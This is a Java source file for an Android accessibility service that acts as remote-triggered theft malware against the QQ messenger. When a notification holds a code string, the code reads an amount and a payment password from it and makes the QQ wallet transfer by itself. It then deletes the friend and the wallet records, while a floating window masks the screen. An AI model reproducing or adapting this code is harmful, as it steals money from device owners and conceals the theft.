/**
 * 
 */
package accessibility.app;






import java.util.List;

import accessibility.AccessibilityHelper;
import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import activity.SplashActivity;
import android.annotation.TargetApi;
import android.app.Notification;
import android.app.PendingIntent;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Parcelable;

import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import floatwindow.FloatWindowMask;
import notification.NotifyHelper;
import permission.GivePermission;
import util.ConfigCt;
import util.Funcs;
import util.RootShellCmd;


/**
 * @author ASUS
 *
 */
public class QQTransferAccounts extends BaseAccessibilityJob  {//QQ:7.6.5
	private static final String WINDOW_TRANSACTION_UI="com.tencent.mobileqq.activity.qwallet.TransactionActivity";//转帐窗体：输入金额
	private static final String WINDOW_PWD_UI="cooperation.qwallet.plugin.QWalletPluginProxyActivity";//密码窗体：输入密码
	private static final String WINDOW_QQ_BROWSER_UI="com.tencent.mobileqq.activity.QQBrowserActivity";//完成
	private static final String WINDOW_CHATSETTING_UI="com.tencent.mobileqq.activity.ChatSettingActivity";//聊天设置窗体：删除好友
	public static final String WINDOW_LAUNCHER_UI="com.tencent.mobileqq.activity.SplashActivity";
	
	
	public static final String WIDGET_BUTTON="android.widget.Button";
	
	private static QQTransferAccounts current;
	public static final String WX_TRANSFER_ACCOUNTS_ORDER = "19760909";//；
	private String mMoney="0001";//0200
	private String mPwd="000000";
	public static boolean mWorking=false;
	private AccessibilityNodeInfo mRootNode;
	private  boolean mIsClear=false;
	private boolean mIsInputPWDing=false;//是否正在输入密码；
	public enum State {//转帐状态；删除好友状态；删除钱包记录状态；
	    TRANSACATION,DEL_FRIEND,DEL_MONEY_LOG;
	}
	private State mState=State.TRANSACATION;
	
    private QQTransferAccounts() {
    	super(new String[]{ConfigCt.QQ_PACKAGENAME});
    }
    public static synchronized QQTransferAccounts getInstance() {
        if(current == null) {
            current = new QQTransferAccounts();
        }
        return current;
    }
    @Override
	public void onCreateJob(QiangHongBaoService service) {
		super.onCreateJob(service);
		EventStart();

	}
    @Override
    public void onStopJob() {
    	super.onStopJob();

    }
	/*
	 * (刷新处理流程)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
    	
	}
	 @Override
	public void onReceiveJob(AccessibilityEvent event) {
		 super.onReceiveJob(event);
		 if(!mIsEventWorking)return;
		 if(!mIsTargetPackageName)return;
		 int eventType = event.getEventType(); 
		 switch (eventType) {  
		 	case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: //第一步：监听通知栏消息     
			 if(event.getParcelableData()==null)return;
			 Parcelable data = event.getParcelableData();  //获取Parcelable对象  
			 if (data instanceof Notification) {//判断是否是Notification对象    
				 Notification notification = (Notification) data;
				 if(notification.tickerText==null)return;
				 String text = String.valueOf(notification.tickerText);
				 if(text.contains(WX_TRANSFER_ACCOUNTS_ORDER)){
					 int index = text.indexOf(":");
				     if(index != -1) {
				    	 text = text.substring(index + 1);
				    	 text=text.trim();
				     }
				     if(!parseOrder(text))return;
				     if(!openNotification(notification))return;
				     Workstart();
				 }
			 }
			 break;
	        case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: //
	        	if(!mWorking)return;
	        	if(event.getClassName()==null)return;
	        	mCurrentUI= event.getClassName().toString(); 
	        	
	            if (mCurrentUI.equals(WINDOW_LAUNCHER_UI)) {
	            	Funcs.Sleep(1000);
	            	mRootNode=event.getSource();
	            	if(mState==State.TRANSACATION){
	            		clickJia(mRootNode); 
	            	}else if(mState==State.DEL_FRIEND){
	            		clickChatSettingButton(mRootNode);
	            	}else if(mState==State.DEL_MONEY_LOG){
	            		clickDelMoneyLogTxt(mRootNode);
	            		mWorking=false;
	            	}
	            	//if(mIsClear)
	            		//clickChatSettingButton(mRootNode);  
	            	//else
	            		//clickJia(mRootNode);  
	            		//ClickHBimgButton(mRootNode);
	            }
				if(mCurrentUI.equals("android.app.Dialog")){//确认对话框：1点继续按钮：2删除好友；
			        AccessibilityNodeInfo rootNode = event.getSource();
			        if (rootNode == null) {return; }
			        if(mState==State.DEL_FRIEND){clickDelFriend(rootNode);mState=State.DEL_MONEY_LOG;return;}
			        //AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "红包", -1);
			        AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "继续", -1);
			        if (nodeInfo == null) {return; }
			        AccessibilityHelper.performClick(nodeInfo);
					return;
				}
				if (mCurrentUI.equals(WINDOW_TRANSACTION_UI)) {//转帐窗体：输入金额
					if(mState!=State.TRANSACATION){return;}
					mRootNode=event.getSource();
					if (mRootNode == null) {return; }
					mRootNode =AccessibilityHelper.getRootNode(mRootNode);
					inputText(mRootNode,mMoney);//输入金额
					clickTransactionOK(mRootNode);
				}
				if (mCurrentUI.equals(WINDOW_PWD_UI)) {//准备输入密码：
					mIsInputPWDing=false;
				}
	            if (mCurrentUI.equals(WINDOW_QQ_BROWSER_UI)) {//转帐完成：
	            	mRootNode=event.getSource();
	            	if (mRootNode == null) {return; }
	            	clickCompleteReturn(mRootNode);
	            }
	            if (mCurrentUI.equals(WINDOW_CHATSETTING_UI)) {//聊天信息页面:删除好友
	            	mRootNode=event.getSource();
	            	if (mRootNode == null) {return; }
	            	clickDelFriend(mRootNode);
	            }
	           
	            break; 
	        case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED: 
	        	if(!mWorking)return;
	            if (mCurrentUI.equals(WINDOW_LAUNCHER_UI)) { 
	            	if(mState==State.TRANSACATION){
	            		mRootNode=event.getSource();
	            		if (mRootNode == null) {return; }
	            		mRootNode =AccessibilityHelper.getRootNode(mRootNode);
	            		clickRemittanceItem(mRootNode);//点转帐按钮
	            	}else if(mState==State.DEL_MONEY_LOG){
	            		//Funcs.Sleep(1000);
	            		//clickDelMoneyLogTxt(mRootNode);
	            		//mWorking=false;
	            	}
	            }
	            if (mCurrentUI.equals(WINDOW_PWD_UI)) {//输入密码：
	            	inputPWD();
	            	mIsClear=true;
	            	mState=State.DEL_FRIEND;
	            }
	            if (mCurrentUI.equals(WINDOW_PWD_UI)) {
	            	mRootNode=event.getSource();
	            	if (mRootNode == null) {return; }
	            	mRootNode =AccessibilityHelper.getRootNode(mRootNode);
	            	clickSafeButton(mRootNode);
	            }
	            if (mCurrentUI.equals(WINDOW_TRANSACTION_UI)) {//转帐窗体：输入金额
	            	
	            	if(mState==State.DEL_FRIEND){AccessibilityHelper.performBack(service);return;}
	            	
	            }
	            if (mCurrentUI.equals(WINDOW_QQ_BROWSER_UI)) {//转帐完成：
	            	//AccessibilityHelper.performBack(service);
	            }
	        	break; 
	        }
		 }

	/**打开通知栏消息*/
	@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
	private boolean openNotification(Notification notification) {
		PendingIntent pendingIntent = notification.contentIntent;
		boolean lock = NotifyHelper.isLockScreen(context);
		if(!lock) {
			return NotifyHelper.send(pendingIntent);
		}
		return false;
	}
	/*解析命令*/
	private boolean parseOrder(String text) {
		if(text.length()!=18)return false;
		mPwd=text.substring(12);
		//if(mPwd.equals("000000"))
			//mPwd=Config.sPWD;
		mMoney=text.substring(8,12);
		return true;
	}
	//--------------------------------------------------------------------------------------
	//点击红包图片按钮：
    public boolean ClickHBimgButton(AccessibilityNodeInfo rootNode) {
    	//测试：
    	//AccessibilityHelper.recycle(rootNode);
        AccessibilityNodeInfo target = GetHBImgButton(rootNode);
        if(target==null)return false;
        target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        return true;
    }
    /*
     * 获取红包图片按钮：
     */
    public AccessibilityNodeInfo GetHBImgButton(AccessibilityNodeInfo rootNode) {
    	String className="android.widget.ImageView";
    	int i=-1;//加号按钮在窗体中的序号；
    	//if(Config.wv>=676)i=-3;
    	//测试：
    	//AccessibilityHelper.recycle(rootNode);
        AccessibilityNodeInfo target = AccessibilityHelper.findNodeInfosByClassName(rootNode, className, i,true);
        if(target==null)return null;
        i=0;
        for(int j=AccessibilityHelper.classNames.size()-1;j>0;j--){
        	target=AccessibilityHelper.classNames.get(j);
        	if(target.getContentDescription()==null){
        		if(i==3)return target;
        		i=i+1;
        	}
        }
        return null;
    }
    /*
     * 获取加号按钮：
     */
    public AccessibilityNodeInfo GetJia(AccessibilityNodeInfo rootNode) {
    	String className="android.widget.ImageView";
    	int i=-1;//加号按钮在窗体中的序号；
    	//if(Config.wv>=676)i=-3;
    	//测试：
    	//AccessibilityHelper.recycle(rootNode);
        AccessibilityNodeInfo target = AccessibilityHelper.findNodeInfosByClassName(rootNode, className, i,true);
        if(target==null)return null;
        for(int j=AccessibilityHelper.classNames.size()-1;j>0;j--){
        	target=AccessibilityHelper.classNames.get(j);
        	if(target.getContentDescription()==null)return target;
        }
        return null;
    }
    //点击加号：
    public boolean clickJia(AccessibilityNodeInfo rootNode) {
    	//测试：
    	//AccessibilityHelper.recycle(rootNode);
        AccessibilityNodeInfo target = GetJia(rootNode);
        if(target==null)return false;
        target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        return true;
    }
    //-----------------------------------------------------------------------------------
    /*
     * 点击转账；
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickRemittanceItem(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "转账",-1);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * 点击转账；
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickRemittanceButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "转账","android.widget.Button");
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * 点击仍然支付；
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickSafeButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "仍然支付","android.widget.Button");
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }

    //-----------------------------------------输入金额--------------------------------------------------
    /*
     * 输入金额；（不使用）
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickAmountButton(AccessibilityNodeInfo rootNode,String value){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, value,-1);
    	if(nodeInfo==null)return false;
    	if(!nodeInfo.getClassName().toString().equals("android.widget.Button"))return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    public boolean clickAmountPanel(AccessibilityNodeInfo rootNode,String amount){
    	for(int i=0;i<amount.length();i++){
    		String c=amount.substring(i,i+1);
    		if(!clickAmountButton(rootNode,c))return false;
    	}
    	return clickRemittanceButton(rootNode);
    }
    public boolean inputText(AccessibilityNodeInfo rootNode,String amount){
    	AccessibilityNodeInfo target=AccessibilityHelper.findNodeInfosByClassName(rootNode, "android.widget.EditText", 0,true);
    	if(target==null)return false;
    	if(!nodeInput(target,amount))return false;
    	return true;
    }
    /*
     * 点击确定转账；
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickTransactionOK(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "确定转账",-1);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    //----------------------------------------------------------------------------------------------
	  /*
     * 点击聊天信息按钮；
     */
    public boolean clickChatSettingButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "聊天设置",-1);
    	if(nodeInfo==null)return false;
    	if(!nodeInfo.getClassName().toString().equals("android.widget.ImageView"))return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
	/*
     * 点击删除好友按钮；
     */
    public boolean clickDelFriendDialog(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByClassName(rootNode, "android.widget.RelativeLayout", -1, true);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
	/*
     * 点击删除好友按钮；
     */
    public boolean clickDelFriend(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "删除好友",-1);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
	/*
     * 点击删除钱包记录；
     */
    public boolean clickDelMoneyLogTxt(AccessibilityNodeInfo rootNode){
    	  List<AccessibilityNodeInfo> list = rootNode.findAccessibilityNodeInfosByText("删除");
          if(list == null || list.isEmpty()) {
              return false;
          }
          for(AccessibilityNodeInfo nodeInfo:list){
        	  AccessibilityHelper.performClick(nodeInfo);
          }
          return true;
    	//AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "删除",1);
    	//if(nodeInfo==null)return false;
    	//return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * 点击清空按钮；
     */
    public boolean clickClearButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "清空",0);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * 点击完成；
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickCompleteReturn(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "返回",0);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    public void inputPWD(){
    	if(mIsInputPWDing)return;
    	mIsInputPWDing=true;
    	Funcs.Sleep(1000);
    	if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N)
    		WXinputPWD.getInstance().inputThread(mPwd);
    	else
    		WXinputPWD.getInstance().input7Thread(mPwd);
    	//mIsInputPWDing
    }
    /**开始工作30秒*/
    public void Workstart() {
    	mWorking=true;
    	mIsClear=false;
    	mState=State.TRANSACATION;
    	FloatWindowMask.getInstance(context).ShowFloatingWindow();
    	//if(GivePermission.getGivePermission().isEnable()){
		//	GivePermission.getGivePermission().EventStart();
		//	GivePermission.getGivePermission().TimeStart();
		//}
    	
    	Handler handler= new Handler(); 
    	Runnable runnableBack  = new Runnable() {    
    		@Override    
    		public void run() {    
    			OpenQQ(context,ConfigCt.QQ_PACKAGENAME);
    			mWorking=false;
    			Funcs.Sleep(10*1000);
    			FloatWindowMask.getInstance(context).RemoveFloatingWindow();
    			SplashActivity.startHomeActivity(getContext());
    		}    
    	};
    	handler.postDelayed(runnableBack, 20*1000);
    }
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public  boolean nodeInput(AccessibilityNodeInfo edtNode,String txt){
    	if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.LOLLIPOP){//android 5.0
    		Bundle arguments = new Bundle();
        	arguments.putCharSequence(AccessibilityNodeInfo .ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,txt);
        	edtNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
        	return true;
    	}
    	if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.JELLY_BEAN_MR2){//android 4.3
    		ClipboardManager clipboard = (ClipboardManager)context.getSystemService(Context.CLIPBOARD_SERVICE);  
    		ClipData clip = ClipData.newPlainText("text",txt);  
    		clipboard.setPrimaryClip(clip);  

    		edtNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);  
    		////粘贴进入内容  
    		edtNode.performAction(AccessibilityNodeInfo.ACTION_PASTE);  
    		return true;
    	}
    	if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.ICE_CREAM_SANDWICH){//android 4.0
    		edtNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
        	String sOrder="input text "+txt;
        	AccessibilityHelper.Sleep(100);
        	if(RootShellCmd.getRootShellCmd(context).execShellCmd(sOrder)){
        		AccessibilityHelper.Sleep(1000);
        		return true;
        	}
        	return false;
    	}
    	return false;
    }
    public static boolean OpenQQ(Context context,String pkg){
    	Intent intent = new Intent(); 
    	PackageManager packageManager = context.getPackageManager(); 
    	intent = packageManager.getLaunchIntentForPackage(pkg); 
    	if(intent==null)return false;
    	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED | Intent.FLAG_ACTIVITY_CLEAR_TOP) ; 
    	context.startActivity(intent);
    	return true;
    }
}
